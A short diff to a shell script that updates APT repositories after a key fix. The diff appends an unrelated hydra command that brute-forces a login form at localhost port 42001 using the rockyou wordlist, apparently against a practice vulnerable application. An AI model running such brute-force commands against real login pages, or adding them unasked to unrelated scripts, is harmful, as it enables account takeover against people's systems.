@@ -27,3 +27,6 @@ echo "[*] Updating APT repositories..."
 sudo apt update
 
 echo "[✔] Done. Repository key issue resolved if no errors appeared above."
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed" -s 42001
+
